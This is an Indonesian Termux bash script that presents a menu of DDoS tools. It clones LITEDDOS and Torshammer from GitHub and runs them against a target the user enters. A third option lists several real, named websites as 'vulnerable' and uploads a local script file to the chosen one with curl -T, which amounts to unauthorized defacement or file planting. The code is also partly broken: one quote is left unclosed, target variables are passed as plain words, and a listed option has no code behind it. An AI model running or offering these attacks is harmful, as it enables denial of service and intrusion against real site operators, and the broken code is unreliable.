#!/system/xbin/bash
#Author InYouDfv47
#Selamat Belajar

clear
blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'    

figlet Bahauddin | lolcat
echo $cyan"Membuat Tools Instaler Sendiri Di Termux"
echo $green"Daftar Toolsnya=>"
echo $purple"[1] DDOS Website Dengan LITEDDOS"
echo $purple"[2] DDOS Website Dengan Torshammer"
echo $purple"[3] DDOS Website Dengan Xerxes"
echo $purple"[4] DDOS Website Dengan Hammer"
echo
echo $green
read -p "╭─[Pilih Nomer]
╰─root@Dfv47=•>" bro

if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
echo $green"Installing LITEDDOS..."
sleep 1
apt update
apt install git
git clone https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS
read -p "MasukanTarget:" target
python2 LITEDDOS.py target 80 100
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
clear
echo $green"Installing.....
apt update
apt install git
git clone https://github.com/dotfighter/torshammer.git
mv torshammer $HOME
cd $HOME/torshammer
read -p "Masukan Target:" target
python2 torshammer.py -T -t target
fi

if [ $bro = 3 ] || [ $bro = 3 ]
then
clear
echo "\033[34;1m"
cowsay -f kiss.cow "MrB4J1N64N" | lolcat
figlet -f slant MrB4J1N64N
echo "\033[37;1m"
echo "Masukan Web target"
echo "Contoh Web Target vuln"
echo "	http://bestilling.udir.no/"
echo "	http://560560.ru/"
echo "	http://myownemailer.com/"
echo "	http://Zoocentral.co.za/"
echo "	http://50-50-50.ru/"
echo "	http://tirupurjobs.net/"
echo "	http://Matrimony.co.za/"
echo "	http://Bheh.co.za/"
read -p "[MrB4J1N64N]>" target
echo "Masukan Nama script kalian"
echo "yang ada di Luar Folder Ruang Penyimpanan"
read -p "[MrB4J1N64N]>" script
curl -T /storage/emulated/0/$script $target
echo "\033[33;1m"
echo "Selesai! Tod Cek di $target $script "
fi
